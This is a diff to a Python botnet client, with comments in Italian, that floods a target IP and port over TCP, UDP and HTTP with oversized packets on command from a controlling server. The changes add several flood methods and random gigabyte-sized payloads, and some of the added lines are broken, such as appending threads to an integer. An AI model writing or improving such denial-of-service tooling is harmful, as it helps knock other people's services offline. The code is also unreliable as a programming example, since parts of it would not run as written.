@@ -1,11 +1,14 @@
 import threading
 import requests
 import socket
+import random
 
 # Dati target
 TYPE, IP, PORT, THREADS, METHOD = "", "", 0, 0, ""
 
 THREADS_LIST = []
+
+PROXIES = []
 
 class Attack:
     
@@ -14,6 +17,21 @@ class Attack:
             threads = int(THREADS)
             for i in range(threads):
                 thread = threading.Thread(target=tcp_flood) # type: ignore
+                THREADS.append(thread)
+        elif METHOD == "UDP_FLOOD":
+            threads = int(THREADS)
+            for i in range(threads):
+                thread = threading.Thread(target=udp_flood) # type: ignore
+                THREADS.append(thread)
+        elif METHOD == "HTTP_FLOOD":
+            threads = int(THREADS)
+            for i in range(threads):
+                thread = threading.Thread(target=http_flood) # type: ignore
+                THREADS.append(thread)
+        elif METHOD == "BIG_PACKET":
+            threads = int(THREADS)
+            for i in range(threads):
+                thread = threading.Thread(target=bigPacket) # type: ignore
                 THREADS.append(thread)
 
     def abort():
@@ -27,7 +45,7 @@ class Attack:
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((IP, PORT))
-            s.send(b"GET / HTTP/1.1\r\nHost: %^&((*&)%$^%$^$%&*()F^T^&T%R&^T*FIG%&TF^UGYYGH56438794536879\r\n\r\n")
+            s.send(b"$1".replace("$1", random.randbytes(1000000000)))
             s.close()
     def udp_flood():
         while True:
@@ -40,7 +58,6 @@ class Attack:
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.sendto(b"A" * 65535, (IP, PORT))
-    
 
 # Funzione per gestire i messaggi dal server
 def receive_messages_from_server(client_socket):
@@ -56,7 +73,6 @@ def receive_messages_from_server(client_socket):
         TYPE = message.split(" ")[0]
         
         if TYPE == "attack":
-            
             TYPE, IP, PORT, THREADS, METHOD = message.split(" ")
             Attack.init()
         elif TYPE == "confirm":
